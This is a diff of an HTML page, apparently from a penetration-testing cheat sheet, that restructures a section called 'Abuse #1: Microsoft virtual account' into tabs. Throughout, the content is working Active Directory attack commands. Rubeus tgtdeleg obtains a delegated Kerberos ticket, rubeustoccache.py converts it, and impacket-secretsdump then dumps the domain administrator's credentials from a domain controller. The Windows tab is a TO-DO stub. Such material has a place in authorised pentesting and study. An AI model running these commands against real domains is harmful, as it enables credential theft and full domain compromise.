@@ -205,14 +205,32 @@
 <div class="content"><hr>
 <h3 id="abuse-1-microsoft-virtual-account">Abuse #1: Microsoft virtual account</h3>
 <h4 id="1-create-a-ticket-from-microsoft-virtual-account">1. Create a ticket from Microsoft virtual account</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div><h4 id="2-convert-kirbi-to-ccache-back-to-linux">2. Convert kirbi to ccache (Back to Linux)</h4>
-<p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></p>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span></code></pre></div></div>
+</div></p>
+<h4 id="2-secrets-dump">2. Secrets Dump</h4>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="3-convert-kirbi-to-ccache">3. Convert kirbi to ccache</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rubeustoccache.py &lt;BASE64_TICKET&gt; secrets.kirbi secrets.ccache
-</span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-secrets-dump">4. Secrets Dump</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass -just-dc-user administrator
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2">TO-DO</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
